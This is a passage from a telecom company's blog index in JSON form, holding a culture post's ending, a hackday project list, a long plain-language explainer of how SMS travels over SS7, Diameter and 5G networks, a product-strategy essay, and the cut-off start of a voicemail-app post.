chosen to use OKRs (Objectives and Key Results) as a tool for that. A tool that helps us discuss and decide together as a team what we want to achieve, but without dictating the how. This is a delicate balance, and we always have to fight to not create too detailed OKRs. The teams and individuals should feel empowered when understanding and agreeing on the why and what, but are allowed to determine the how.\\n![Decorative illustration](/img/blog/were-all-grownups-here/03.png)\\n\\n## Stay open to change\\n\\nSo do we have improvement areas? Of course! One example is that I believe we can be better at living one of our values which is \u201cTough Love\u201d. This relates to among other things how we give feedback. I wouldn\u2019t say we are bad at it, but our inclination is often towards being a bit too soft, which sometimes leads to unclear feedback or neglecting giving feedback. So we need to keep practicing to make sure we challenge and develop each other as much as we can. And I\u2019m sure it\u2019s a bunch of other stuff. We are still a young company and open to change - we try out stuff and sometimes fail. We keep on learning and making small tweaks all the time to adjust to our team. Just this morning I listened to an inspiring 5 min talk from Lucy Adams about probation periods and realized that we have those in our contracts -  yikes that doesn\u2019t exactly scream that we trust who we recruit does it? I will look into that asap\u2026\\n\\nSo, we are all grownups here. At least most of the time. Although maybe not when the Trondheim team bought naughty chocolates and expensed it to see if anyone would notice (we didn\u2019t)."},{"id":"hackdays-october-2020","metadata":{"permalink":"/blog/hackdays-october-2020","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2020-10-28-hackdays.md","source":"@site/../blog/2020-10-28-hackdays.md","title":"October Virtual Hackdays","description":"this week we started off with a three days hackathon!","date":"2020-10-28T00:00:00.000Z","formattedDate":"October 28, 2020","tags":[{"label":"hackathon","permalink":"/blog/tags/hackathon"}],"readingTime":1.705,"truncated":true,"authors":[{"name":"Everyone @ wgtwo","title":"\ud83c\udf55","url":"https://www.wgtwo.com","imageURL":"/img/favicon-black.svg","key":"wgtwo"}],"frontMatter":{"slug":"hackdays-october-2020","title":"October Virtual Hackdays","date":"2020-10-28T00:00:00.000Z","tags":["hackathon"],"authors":"wgtwo"},"prevItem":{"title":"We\'re all grownups here","permalink":"/blog/were-all-grownups-here"},"nextItem":{"title":"What the heck is a short message?","permalink":"/blog/what-is-a-short-message"}},"content":"this week we started off with a three days hackathon!\\n\\nEvery quarter **wgtwo** holds a three day hackday. Hackdays are a great way for everyone in the company to work together in creating new innovative solutions for every day problems.\\n\\n\x3c!--truncate--\x3e\\n\\nThis time, we had the joy of having a three day remote hackday that included 10+ teams and yes - *pizza*.\\n\\n<img class=\\"image\\"\\n    src=\\"/img/blog/hackdays-october-2020/presentations.png\\"\\n    alt=\\"Most of us\\" />\\n\\n# Hackday Presentations\\n\\n## Grafana Annotations\\n\\n*Team: Jonny, Per, Victoria*\\n\\nAdd git commit and other tags (i.e. pagerduty alerts) as annotations in Grafana.\\n\\n## Tokens to the people\\n\\n*Team: H\xe5kon*\\n\\nEasy access to create new developer tokens to our APIs.\\n\\n## It\'s broken (or malware)\\n\\n*Team: Holger, Noy*\\n\\nSetup pies to be able to automate testing.\\n\\n## Java 11 Toolchain\\n\\n*Team: Stein Eldar*\\n\\nUpgrade of Java toolchain in Bazel!\\n\\n## Random bazel facts\\n\\n*Team: Konstantin*\\n\\nGood to have configurations for Bazel caching.\\n\\n## GTP-C tracing on PGW\\n\\n*Team: Pavel*\\n\\nInvestigate and experiment how to upload PCAP traces from PGW in S3.\\n\\n## mtr-packet-exporter\\n\\n*Team: Bj\xf8rn*\\n\\nExport routing hops and latency metrics to prometheus.\\n\\n## Kafka voice - kava\\n\\n*Team: Sergey*\\n\\nKafka instead of Firebreeze as a backend for Voice.\\n\\n## Parental Control on PGW\\n\\n*Team: Etienne / Nicholas*\\n\\nDynamic subscriber-based APN configurations for parental control DNS.\\n\\n## text rules\\n\\n*Team: J\xf8rund*\\n\\nMigrating SMS forwarding into a separate app under **wgtwo** developer platform.\\n\\n## Distributed tracing\\n\\n*Team: Karl Johan/William*\\n\\nJaeger tracing to be able to follow time spent in different components.\\n\\n## 3 ideas to attract/hire engineers\\n\\n*Team: Ana/Jessica*\\n\\nAdvent of code, showing engineering day-to-day work, image/video snippets.\\n\\n## MQTT for events\\n\\n*Team: GI*\\n\\nHome automation with MQTT server as an app.\\n\\n## David sucks at load testing (loomylin)\\n\\n*Team: David*\\n\\nUtilize project Loom to get lightweight virtual threads in JVM.\\n\\n## AWS Transit Gateway\\n\\n*Team: Erhan*\\n\\nMaintaining routes and connecting subnets between VPCs with a transit gateway.\\n\\n## PCAP traces as JSON\\n\\n*Team: Masse*\\n\\nTranslate pcaps to a readable format and upload it to Athena.\\n\\n<img class=\\"image\\"\\n    src=\\"/img/blog/hackdays-october-2020/hackday.jpeg\\"\\n    alt=\\"hackday logo stickers\\" />"},{"id":"what-is-a-short-message","metadata":{"permalink":"/blog/what-is-a-short-message","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2020-10-01-what-is-short-messages.md","source":"@site/../blog/2020-10-01-what-is-short-messages.md","title":"What the heck is a short message?","description":"I will try as best as I can to give an explanation of what happens","date":"2020-10-01T00:00:00.000Z","formattedDate":"October 1, 2020","tags":[{"label":"telco","permalink":"/blog/tags/telco"},{"label":"MAP","permalink":"/blog/tags/map"},{"label":"TCAP","permalink":"/blog/tags/tcap"},{"label":"SS7","permalink":"/blog/tags/ss-7"},{"label":"Forward-SM","permalink":"/blog/tags/forward-sm"},{"label":"SMS","permalink":"/blog/tags/sms"}],"readingTime":13.255,"truncated":true,"authors":[{"name":"Sebastian Weddmark Olsson","title":"Software Engineer @ wgtwo","url":"https://www.linkedin.com/in/sebastian-weddmark-olsson/","imageURL":"https://media-exp1.licdn.com/dms/image/C5603AQGKBPb8-fRQrw/profile-displayphoto-shrink_400_400/0/1552936055035?e=1648684800&v=beta&t=Um5M-sEowAYCYIc3uW4aXlzDM7pQSbK1SIEEJPcJD2M","key":"seba"}],"frontMatter":{"slug":"what-is-a-short-message","title":"What the heck is a short message?","date":"2020-10-01T00:00:00.000Z","tags":["telco","MAP","TCAP","SS7","Forward-SM","SMS"],"authors":"seba"},"prevItem":{"title":"October Virtual Hackdays","permalink":"/blog/hackdays-october-2020"},"nextItem":{"title":"A new hope for products in telecom","permalink":"/blog/a-new-hope-for-products-in-telecom"}},"content":"I will try as best as I can to give an explanation of what happens\\nwhen you send an SMS from your phone.\\n\\nDisclaimer: Telco stuff is hard.\\n\\nAlso disclaimer: this blog post will also contain alot of ackronyms,\\nafter all, it is telco.\\n\\n_Aaand down the rabbit hole we go..._\\n\\n\x3c!--truncate--\x3e\\n\\n# Where to even start\\n\\nIn the *SS7* (telco/telecom/telecommunications) network there are many\\ndifferent nodes (servers), with different kinds of tasks.\\n\\nThe group of protocols that is used to send signals over *IP* between\\nthese nodes is called *SIGTRAN* (derived from \\"signaling transport\\").\\nOlder networks that have not switched to *IP* do not use *SIGTRAN*.\\n\\n*SIGTRAN* protocols are the lower layer protocols used for signaling,\\nthey range from *SCTP* (Stream Control Transmission Protocol) to\\n*M2PA* (Message Transfer Part 2 User Peer-to-Peer Adaptation Layer)\\nand *M3UA* (Message Transfer Part 3 User Adaptation Layer).\\n\\n*SCTP* is like a mix between *UDP* and *TCP*. It is supposed to be\\nquicker than *TCP*, but more reliable than *UDP*.\\n\\nBoth *M2PA* and *M3UA* support *SCTP* management, and the reporting of\\nstatus changes of those, as well as providing transfer of *MTP3*\\n(Message Transfer Part 3) messages.\\n\\nOn top of *SIGTRAN* are the *SS7* protocols.\\n\\nWhat I\'m going to talk about are the protocols on the very top of *SS7*,\\nspecifically the *MAP* (Mobile Application Part) as well as the *TCAP*\\n(Transaction Capabilities Application Part). There are other protocols\\ninbetween, for instance *SCCP* (Signalling Connection Control Part)\\nwhich handles some handshaking, routing, and resilience.\\n\\nThe *MAP* layer is used when talking to some of the telco nodes such\\nas *HLR* (Home location registry), *VLR* (Visitor location registry),\\n*MSC* (Mobile switching centre), *SGSN* (Serving *GPRS* [ackronym in\\nackronyms; go telco!] support node) and the *SMSC* (Short message\\nservice centre).\\n\\n# MAP versions and TCAP dialogues\\n\\nThere are some iterations of *MAP* (v1, v2, v3, and v4) and messages\\nalmost always come in pairs, an acknowledgement (`ReturnResult` or\\n`ReturnError`) for each sent message (`Invoke`).\\n\\nTo determine which version to use between two nodes, the sending node\\ntries to start the transaction (called a dialogue) by sending a *TCAP*\\n`Begin` message with the *MAP* message and it\'s highest compatible\\nversion. If the receiving node cannot talk that version, it sends a\\n*TCAP* `Abort` message with it\'s highest compatible version. In v1\\nthere might not even be a reason, just an empty `Abort`; the sending\\nnode might then try to send the *MAP* message as v1 anyway.\\n\\nIn my head it goes like this:\\n\\n```\\nNode 1: \\"Hi, I want to talk version 3 to you about this\\"\\nNode 2: \\"No I don\'t understand you, but we can talk version 2 about it instead\\"\\nNode 1: \\"Ok, then I want to talk version 2 to you about this instead\\"\\nNode 2: \\"Aah, now I see...\\"\\n```\\n\\nOr maybe\\n\\n```\\nNode 1: \\"Hi, I want to talk version 3 to you about this\\"\\nNode 2: \\"No\\"\\nNode 1: \\"Ok, then I want to talk to you about this in version 1 instead\\"\\nNode 2: \\"Maybe I will talk to you, maybe I will not\\"\\n```\\n\\nFor *TCAP* dialogues there are (mainly) four message types.  `Begin`,\\n`Continue`, `End`, `Abort`. Each of the types have an ID (or two, as I\\nsaid, telco is complicated), a component and a dialogue part. The\\ncomponent contains the *MAP* message. The dialogue part contains\\nthe version and application to use (that is *MAP* Application;\\ni.e. which type of message it contains), but it is only used in the\\nfirst message from both nodes for the version negotiation.\\n\\n_I think this covers most of it, let\'s get back to the fun part._\\n\\n# How does SMS work?\\n\\n*SMS* was initally implemented because of the wish to send text\\nmessages to pagers using the phoneline when it was not in use for\\nphonecalls. It was decided at a meeting in Oslo to be released to the\\npublic when some French and German company understood it\'s\\nvalue. (Don\'t quote me on any of this).\\n\\nWhen you send an *SMS*, the *SMS* is transfered to the *MSC* or the\\n*SGSN* in your current (serving) network. The *MSC* or *SGSN* then\\nsends an packet called `MO-Forward-SM` towards the *SMSC* in your\\ncurrent network. It stands for \\"Mobile Originating Forward Short\\nMessage\\" meaning it started from your (mobile-)phone.\\n\\nThe *SMSC* then asks the recipients HLR about the routing details for\\nthe *SMS*. It does so by sending another *MAP* message of type\\n`sendRoutingInfoForSM` requesting the location of the recipients *MSC*\\nor *SGSN*, or both.\\n\\nThe *SMSC* then sends another packet, this time a `MT-Forward-SM`,\\ntowards the *MSC* in the recipients network. In this case *MT* stands\\nfor Mobile Terminated, meaning it goes towards the recipients phone.\\n\\n_Dia have amazing icons:_\\n<div>\\n    <img src=\\"/img/blog/sms/forward-sm.svg\\" alt=\\"You calling your mom\\" />\\n</div>\\n\\nThe similarities in *MO* and *MT* requests are that they both contain\\na origin and destination address as well as the user data (your actual\\ntext message), and a possibly a correlation id which is basically a\\nmapping between your SIM-card id and a temporary id and was originally\\nused for making sure that the sending network paid for *SMS*s towards\\nthe receiving network.\\n\\nFor *MO* the origin address is your *MSISDN* (read telephone number),\\nand the destination is the *GT* address (Global title; a way to route\\nstuff) of the *SMSC*. For *MT* messages the origin address is the *GT*\\nof the *SMSC* and the destination address is either the recipients\\n*IMSI* (read SIM-card) or the recipients correlation id. It could also\\nbe a *LMSI* which is a 4-byte network location identifier if the\\nrecipient is also within the same network as the sender.\\n\\n## Ever wondered why there is a limit to the size of the text message you are sending?\\n\\n<div class=\\"left-right-row\\">\\n    <div class=\\"text\\">Two characters left on a GSM7 encoded SMS.</div>\\n    <img class=\\"image\\" src=\\"/img/blog/sms/160_chars.png\\" alt=\\"Characters left: 2/160\\" />\\n</div>\\n\\nIf you (god forbid) you would break the protocol and send a text\\nmessage greater than 140 bytes, which translates to 160, 152, or 70\\ncharacters depending on locale [1], then your phone would break up the\\nmessage into multiple text messages. This arbitrary size of 140 bytes\\nis not really arbitrary at all. It was chosen because it would\\nprecisely fit into a single *MTP3* *SIF* (Signalling Information\\nField) when routing label, *SCCP*, *TCAP* and *MAP* layers were taken\\ninto account.\\n\\n[1] There is something called *GSM7* bit-packing. Instead of using 1\\nbyte (8 bits) per character, *GSM7* uses 7 bits. This means that\\ninstead of 140 characters, you can get up to 160 characters per\\n*SMS*. The drawback is that you will have a smaller subset of\\ncharacters to use, only the most common is supported. If you include\\nany non-*GSM7* characters in your *SMS* then the *SMS* will\\nautomatically be converted to use either *USC-2* or *GSM7* with a\\ndifferent charset instead. *USC-2* uses 2 bytes, or 16 bits, instead\\nof *GSM7*s 7 bits. That leaves you with 70 characters per\\n*SMS*. *USC-2* is similar for the basic multilingual plane (*BMP*) to\\n*UTF-16*. In fact *UTF-16* is an extension of *UCS-2*. The main\\ndifference is that *USC-2* is fixed width and does not allow for the\\nextended characters in the private use area of *BMP*. *UTF-16* is\\nvariable width of one or two 16-bits code points, and does allow the\\nextended characters. For extended characters to work (for instance\\n\\"praying/folded hands\\" &#x1F64F;), phones might try to fake *UTF-16*\\nby using two *USC-2* characters. New phones can handle this fine, but\\nolder phones might receive two question marks as they cannot decode it\\nproperly.\\n\\nIf *GSM7* have a modified charset (i.e. not the default *BMP*) then\\nthere will be a header in front that specifies that. That header will\\ntake up 7 bytes after packing (in other words 8 characters), making\\nthe maximum length of the *SMS* 152 characters.\\n\\n<div class=\\"left-right-row\\">\\n    <img class=\\"image\\" src=\\"/img/blog/sms/67_chars.png\\" alt=\\"Characters left: 45/67 (3)\\" />\\n    <div class=\\"text\\">\\n        Using emojis will convert the encoding to USC-2. Note the missing 3\\n        characters and that there are multiple SMSes. When multiple messages\\n        are sent, the phone needs some way of telling how to reassemble the\\n        messages. The headers take up 6 bytes per message for this purpose.\\n    </div>\\n</div>\\n\\nHowever when *MAP* v2 started to use *TCAP* dialogues there was more\\ninformation to put into the packet and 140 bytes might not be left for\\nthe *SMS*. The *SMSC* would then need to break up the message into\\nchunks, and start the transaction an empty *TCAP* `Begin` message and\\nset a flag in the *MT* request called `moreMessagesToSend`. It would\\nthen send the actual text inside `Continue` messages. In the end\\nthe `End` (_hehe_) message is transmitted as a response and the\\ntransaction is finished.\\n\\nThe response back to a *MO* request is, as previous stated, an\\nacknowledgement if the *SMS* have been successfully submitted to the\\n*SMSC* or not (again either `returnResult` or `returnError`). For *MT*\\nrequests the acknowledgement is if the *SMS* is successfully delivered\\nor not.\\n\\nIf the *MT* request is not successful, the *SMSC* could ask the *HLR*\\n(the Home Location Registry is basically a database containing user\\nsubscriptions and knowledge of which nodes the mobile talked to\\nlatest) to be notified when the user comes back online. A bunch of\\nother *MAP* messages are then involved, such as\\n- `reportSMDeliveryStatus`,\\n- `informServiceCentre`,\\n- `alterServiceCentre`, and\\n- `readyForSM`.\\n\\n_At least this is main idea I think..._\\n\\n# Differences in MAP versions for SMS\\n\\nThere are three *MAP* versions defined for *SMS*. The latest version\\n(v4) is not used in the context of *SMS*.\\n\\nIn version 1, the dialogue portion was not invented and all chunks are\\nsent in new *TCAP* dialogues. The size of the user data could then\\nbe 140 bytes.\\n\\nIn version 1 and version 2 there is no difference between *MT* and\\n*MO*. Everything is sent as another type of message `Forward-SM`,\\nwhich does not include any privacy correlation ids, and there are no\\nfancy responses with delivery status. There is still an\\nacknowledgement, but is in a form of an empty message.\\n\\nOnly way to see difference between an *MO* and a *MT* in version 1 is\\nto look at the addresses and see if they are either coming from an\\n*SMSC* or going to an *SMSC*.\\n\\nThe `moreMessagesToSend` flag was implemented in version 2, so it exist\\nonly for version 2 and version 3.\\n\\nOk, to recap, what do we have now\\n\\n- `Begin`, `Continue`, `End`, `Abort` messages.\\n- Dialogue handshake in the first request/response messages sent.\\n- `MT-Forward-SM`, `MO-Forward-SM`, `Forward-SM`\\n- Involved parties: Mobile phones, *MSC* and *SMSC*\\n\\n_Wait we are missing something. I\'ve only covered 2G,3G.._\\n\\n# What about 4G/LTE and beyond (5G)?\\n\\n_Ouch._\\n\\n*LTE* networks does not use any of the *M3UA*, *SCCP*, *TCAP*, *MAP*\\nprotocols. In *LTE* networks the main message type is *Diameter* which\\ndoesn\'t contain fragmentation and can contain larger\\nmessages. Everything is sent in one request and every request is\\nanswered with a response. *Diameter* could use either *TCP* or *SCTP* as\\ntransport layer.\\n\\nTo make *SMSes* work on *LTE* networks a new interface *SGs* was\\ninvented which translates *SS7* messages to *Diameter* messages.  This\\ninterface is in most cases used by the *MSC* to translate the messages\\nto *Diameter* and forward it to the *MME* (Mobility Management Entity,\\nsimilar to *SGSN* but in the *LTE* network). The *MME* then forwards\\nit to the *UE* (user equipment, same as mobile subscriber or *MS* in\\n*GSM*/*GPRS* networks).\\n\\nThere is also the *SM-over-IP* that does not use *Diameter*. Instead\\nit uses the *SIP*-protocol (Session Initiation Protocol) to transfer\\nmessages over *IP* and *TCP* or *UDP* to the *IMS* (IP Multimedia\\nSubsystem). *SIP* is also used to enable VoLTE (Voice over *LTE*).\\n\\nFor 5G the *SMSC* is called *SMSF*; The Centre becomes a Function. The\\nsignalling will be based on *HTTP2*/*JSON* ontop of *TCP*. The *SMSF*\\nwill still need to support both *MAP* and *Diameter*.\\n\\n\\nRelevant [xkcd](https://xkcd.com):\\n<div class=\\"left-right-row\\">\\n    <table class=\\"text\\">\\n        <tr>\\n            <td>Generation</td>\\n            <td>2G/3G</td>\\n            <td>4G</td>\\n            <td>5G</td>\\n        </tr>\\n        <tr>\\n            <td>Radio technology</td>\\n            <td>GSM/GPRS</td>\\n            <td>LTE</td>\\n            <td>NR</td>\\n        </tr>\\n        <tr>\\n            <td>Protocol group</td>\\n            <td>SS7</td>\\n            <td>Diameter</td>\\n            <td>HTTP2/JSON</td>\\n        </tr>\\n        <tr>\\n            <td></td>\\n            <td>Node</td>\\n            <td>Agent</td>\\n            <td>Function</td>\\n        </tr>\\n        <tr>\\n            <td>Session management</td>\\n            <td>SGSN</td>\\n            <td>MME</td>\\n            <td>AMF</td>\\n        </tr>\\n        <tr>\\n            <td>SM management</td>\\n            <td>SMSC</td>\\n            <td>SMSC</td>\\n            <td>SMSF</td>\\n        </tr>\\n        <tr>\\n            <td>User management</td>\\n            <td>HLR</td>\\n            <td>HSS</td>\\n            <td>UDM</td>\\n        </tr>\\n        <tr>\\n            <td>Device</td>\\n            <td>MS</td>\\n            <td>UE</td>\\n            <td>UE</td>\\n        </tr>\\n    </table>\\n    <a class=\\"image\\" href=\\"https://xkcd.com/2365/\\"><img src=\\"https://imgs.xkcd.com/comics/messaging_systems.png\\" /></a>\\n</div>\\n\\n# Headache\\n\\nHopefully you did not get a (too severe) headache by reading this\\npost.\\n\\nI\'ve spared you with **a lot** of details on the lower level of\\nprotocols. There are loads of implementation details that must match\\nthe specifications, otherwise you will get all kinds of aborts and\\npossibly even dropped traffic.\\nFor instance we learned that we accidentally sent dialogue portions in\\nmore than the first response back, which seemed to work at first\\nglance; at closer inspection we found out that some messages were\\ndropped because the length of the packet became larger in size than an\\nallowed value. We could still send them, but the other side was not\\nable to receive them.\\n\\nRemember: Telco is old and complex. However, it should still function\\nwith different setups and on different hardware, vendors and with\\nenvironment.\\n\\nFun-fact: Sometimes a boolean value is not just encoded as a 1\\nor 0. To save bandwith telco decided that you could also just define\\nit as a `NULL OPTIONAL` meaning that if it is defined (but lacks a\\nvalue), then it is considered true.  if it is not defined then it is\\nconsidered false. This is the case for the `moreMessagesToSend` flag.\\n\\nHope you enjoy the reading as much as I enjoy digging into these\\nprotocols!\\n\\nSpecial thanks to *Stein Eldar* and *Tobias* for giving me feedback\\nand answering all my stupid questions on this subject, and *Atanas*\\nfor making me realize there are yet other protocols to carry *SMS*.\\nAlso *Bung* for this amazing addition:\\n\\n#### Addition from *Bung*\\n\\n\\"I\u2019ve spared you with a lot of details on the lower level of\\nprotocols\\" needs a lot of emphasis.\\n\\nSome funny extra complexities that just came into my mind while\\nreading:\\n\\nThe actual *SMS* text goes into a field called \\"user data\\". There is a\\nfield called \\"user data length\\". When the message is *GSM7* encoded, the\\n\\"user data length\\" is the number of characters in the text message,\\notherwise it\'s the number of bytes in the user data.\\n\\nNormally the user data only contains the (encoded) text of the\\nmessage, but there is a field called \\"user data header\\" which\\nindicates that there is a length prefixed TLV header in the \\"user\\ndata\\". If the message is *GSM7* encoded, then the \\"user data lenght\\"\\nfield needs to be filled as if the \\"user data header\\" was really *GSM7*\\nencoded, which it isn\'t.\\n\\n*GSM7* is really a variably septet encoding, one character can consist\\nof either 7 or 14 bits similar to how a *UTF-8* code point can be 8,\\n16, 24, or 32 bits. Unlike *UTF-8* however, there are not multiple\\nbyte ranges corresponding to the different locales (called code pages\\nin Unicode) but a single 7 bit shift character that says that\\nfollowing 7 bits should be interpreted as a character from a\\ntranslation table which is communicated out of band.\\n\\nSo all that is only the complexities of a single field (the user data)\\nfor a single encoding (*GSM7*).\\n\\nThen the real kicker: The protocol for *SMS* is really called *SM-TP*\\n(Short Message Transfer Protocol). *SM-TP* is the same for 2G/3G (on top\\nof *MAP*), 4G (on top of *SIP*), 5G (on top of *HTTP*). So the very\\nsame stupid \\"length prefixed TLV encoded headers concatenated with\\nencoded text with length either in characters or in bytes depending on\\nencoding and actual meaning of the encoding communicated out of band\\nbut only sometimes\\" field exists no matter if your talking over old\\nlegacy *MAP* or the modern *HTTP/XML* based 5G."},{"id":"a-new-hope-for-products-in-telecom","metadata":{"permalink":"/blog/a-new-hope-for-products-in-telecom","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2020-08-28-a-new-hope-for-products-in-telecom.md","source":"@site/../blog/2020-08-28-a-new-hope-for-products-in-telecom.md","title":"A new hope for products in telecom","description":"This blog post will cover technology driven products that rely on telecom infrastructure, and not price plans, bundles, or marketing gimmicks. Anyone who has created a product and brought it to market more than once will tell you that it is hard.","date":"2020-08-28T00:00:00.000Z","formattedDate":"August 28, 2020","tags":[{"label":"telecom","permalink":"/blog/tags/telecom"},{"label":"software-development","permalink":"/blog/tags/software-development"},{"label":"core-network","permalink":"/blog/tags/core-network"},{"label":"app-ecosystem","permalink":"/blog/tags/app-ecosystem"}],"readingTime":5.985,"truncated":true,"authors":[{"name":"Marius Waldum","title":"Head of Product @ wgtwo","url":"https://www.linkedin.com/in/mariuswaldum/","imageURL":"https://media-exp1.licdn.com/dms/image/C4D03AQEBVz5L0pV2Rg/profile-displayphoto-shrink_400_400/0/1517238318977?e=1648684800&v=beta&t=rMlngb30kEIKueqRIEGWxB6SevOLZcfEn7lsWYCLngQ","key":"marius-waldum"}],"frontMatter":{"slug":"a-new-hope-for-products-in-telecom","title":"A new hope for products in telecom","date":"2020-08-28T00:00:00.000Z","tags":["telecom","software-development","core-network","app-ecosystem"],"authors":"marius-waldum"},"prevItem":{"title":"What the heck is a short message?","permalink":"/blog/what-is-a-short-message"},"nextItem":{"title":"Building software for a telecom core network","permalink":"/blog/building-software-for-a-telecom-core-network"}},"content":"This blog post will cover technology driven products that rely on telecom infrastructure, and not price plans, bundles, or marketing gimmicks. Anyone who has created a product and brought it to market more than once will tell you that it is hard.\\n\\n\x3c!--truncate--\x3e\\n\\nThe prerequisites for a great product is that:\\n1. It is valuable to the user and customer\\n2. It is easy enough to use so that the user can actually realise the value\\n3. It is feasible to build given the restraints you have on technology, legal, etc.\\n4. And on top of that it needs to make sense for your business\\n\\nEven if you succeed at all of this, you still have to market, sell and support it. I don\u2019t know anyone - nor have I ever heard about any company - that is able to get this right every time.\\n\\n## Remember that one?\\nEven Apple (with Steve Jobs still at the helm) had their flops. Remember \u201ciTunes Ping\u201d? No? Exactly.\\n\\nMaybe you\u2019re more into social products, so you bought \u201cFacebook Home\u201d? No I\u2019m not talking about your Facebook wall or anything you see on a screen, but an actual screen produced by Facebook that you place in your home as you would a framed photo.\\n\\nWell, those products were bold bets. A tech giant launching a smartphone wouldn\u2019t be that risky, would it? Pull out your Amazon Fire Phone and Google it! Ah.. that\'s right! That one got discontinued just 13 months after launch.\\n\\n## Oh the pain!\\nIt\u2019s never fun to see a product fail. When it happens, not only do the customers miss out on something potentially great, but it can end in billion dollar write offs and laying off thousands of employees.\\n\\nOperators are often hit hard by these failures, but companies like Apple, Facebook, Amazon and many others can have product flops regularly and still grow and become even more successful. **Why is that?**\\n\\n\\n## Learning from failure\\nIt\u2019s easy to make fun of big companies that launch products that flop, but we really shouldn\u2019t. Products that flop aren\u2019t a symptom of something that\u2019s wrong. Like Edison put it \u201cI have not failed. I\'ve just found 10,000 ways that won\'t work.\u201d\\n\\nCompanies like Apple, Facebook and Amazon have figured out how they can continue to find 10,000 ways that won\u2019t work so that they can create that one light bulb every now and then - and by doing so totally dominate their market.\\n\\nThey do this by empowering teams to\\n1. Assess new opportunities\\n2. Discover new products\\n3. Build quickly\\n4. Test and learn early\\n\\nThis is how 10,000 small bets are made.\\n\\n## Failing to learn\\nBig traditional companies used to pour tens of millions of dollars into 1 big bet with a few years apart. This is the opposite of Edison\u2019s approach. They never say it out loud but their quote could have been \u201cI have failed, and I\u2019m still clueless whether the other 9,999 ways could have worked\u201d.\\n\\nThese days though, most big traditional companies have moved away from the \u201c1 big bet approach\u201d and created \u201cdigital departments\u201d.\\n\\nThey hire people who have had success in companies that make many small bets, and they give them the freedom to organize themselves so that they can use the same methods. Some time goes by and there are few - or no - small bets placed.\\n\\nOften the teams in these digital departments are empowered to:\\n1. Assess new opportunities\\n2. Discover new products\\n\\nBut the technology fundamentals are not in place yet, so they are not able to:\\n3. Build quickly\\n\\nWhich makes it impossible to:\\n4. Test and learn early\\n\\nThis is especially true for companies with systems that rely on telecom operators. A company that wants access to, or change part of, a solution that has to do with telecommunication has to contact their operators, then the operator typically has to contact their vendor, then the vendor typically creates a change request ticket in their system, and then finally they get back with a fix.\\n\\nAdding that long wait to what should have been \u201cbuilt quickly\u201d is exactly how they go from many small bets to 1 big bet.\\n\\n## Giving up\\nThe end result, be it from the 1 big bet approach or a failed digital department, is that the big company decides to \u201cget back to basics\u201d, \u201cstick with what they know\u201d, and \u201cstrengthen the core business\u201d - meaning that they have entirely given up trying to create new products that people love.\\n\\nThe customers miss out on great new products, employees leave, and the business suffers.\\n\\n## A new hope\\nOur company got started because of this pain. Getting access to a mobile core network to create even small products is hard.\\n\\nIf you are lucky enough to actually get access, what you will see is a closed, uniquely configured core network built on top of nodes from external vendors. Add to the mix that you need people who actually know how to build anything on top of old telecom protocols and you have a perfect storm. If you have all of this and somehow are able to build a successful product, guess what? It doesn\u2019t scale to any other operator because they also have their own uniquely configured core network. And the privilege of getting access is reserved for employees and an exclusive list of vendors. If you are an independent product company who wants to build something cool you can forget about it!\\n\\nThis is why we built a mobile core network from scratch on top of AWS. Long story short this means that every operator using our core can use any product that is built with the [wgtwo developer portal](http://developer.wgtwo.com/).\\n\\nWe believe that subscribers will start to expect that they can add a range of valuable products to their subscription. This means going from a world where everyone gets the same standardized service from their operator - to a world where subscribers are treated as individuals who are free to activate the products that they want.\\n\\nThe way we do this is by enabling 3rd party developers (you!) to create products, and matching these products with operators so that the products are brought to the market for subscribers to enjoy.\\n\\nIn short, with the wgtwo developer portal, it is possible to build quickly, so you can test and learn early, making it possible to reduce the size of your bets, and increasing the chance of building great products that people love!\\n\\n## Try it out and join us\\nWe hope to get your feedback so that we can keep our bets small, and keep learning!\\n\\nWant to read about the first product we created, and how you can do the same using the developer portal? Check out my teammate David\u2019s post on [Building software for a telecom core network](https://wgtwo.com/blog/building-software-for-a-telecom-core-network).\\n\\nJoin us at [TADHack remotely](https://tadhack.com/2020/global/tadhack-trondheim-norway/) or at one of our locations in [Trondheim](https://tadhack.com/2020/global/tadhack-trondheim-norway/) or [Stockholm](https://tadhack.com/2020/global/tadhack-stockholm-sweden/) on October 10 and 11. It\u2019s completely free, and you will get to play around with our APIs, meet some cool people, eat, drink and have fun. Hope to see you there!"},{"id":"building-software-for-a-telecom-core-network","metadata":{"permalink":"/blog/building-software-for-a-telecom-core-network","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2020-08-21-building-software-for-a-telecom-core-network.md","source":"@site/../blog/2020-08-21-building-software-for-a-telecom-core-network.md","title":"Building software for a telecom core network","description":"One of the goals of wgtwo is to enable operators and third parties to build products and services for the \u201ccore network\u201d of the telecom stack. In short, this means providing API access to a subscription\u2019s telecom functionality (messaging, calling, etc). In this article we will show how we built VoiceBox, a Voicemail forwarding application.","date":"2020-08-21T00:00:00.000Z","formattedDate":"August 21, 2020","tags":[{"label":"telecom","permalink":"/blog/tags/telecom"},{"label":"software-development","permalink":"/blog/tags/software-development"},{"label":"core-network","permalink":"/blog/tags/core-network"},{"label":"app-ecosystem","permalink":"/blog/tags/app-ecosystem"}],"readingTime":6.12,"truncated":true,"authors":[{"name":"David \xc5se","title":"Tech Lead @ wgtwo","url":"https://linkedin.com/in/davidaase","imageURL":"https://media-exp1.licdn.com/dms/image/C4D03AQFD4dPSvm-pIg/profile-displayphoto-shrink_400_400/0/1541960720294?e=1648684800&v=beta&t=sj0aTz-Im1u46B5m3O5KMPMD-PydrJoewIoeII5zP1k","key":"david-\xe5se"}],"frontMatter":{"slug":"building-software-for-a-telecom-core-network","title":"Building software for a telecom core network","date":"2020-08-21T00:00:00.000Z","tags":["telecom","software-development","core-network","app-ecosystem"],"authors":"david-\xe5se"},"prevItem":{"title":"A new hope for products in telecom","permalink":"/blog/a-new-hope-for-products-in-telecom"},"nextItem":{"title":"Choosing an Erlang formatter","permalink":"/blog/choosing-erlang-formatter/"}},"content":"One of the goals of **wgtwo** is to enable operators and third parties to build products and services for the \u201ccore network\u201d of the telecom stack. In short, this means providing API access to a subscription\u2019s telecom functionality (messaging, calling, etc). In this article we will show how we built VoiceBox, a Voicemail forwarding application.\\n\\n\x3c!--truncate--\x3e\\n\\n## The product\\n\\nOne of the most common complaints people have with their Voicemail service in Europe is that you have to call in to your Voicemail to listen to your messages. In order to play the message, you have to navigate through a slow voice menu using your dialpad. We believed this would be easy to improve.\\n\\nOur product idea was simple. When 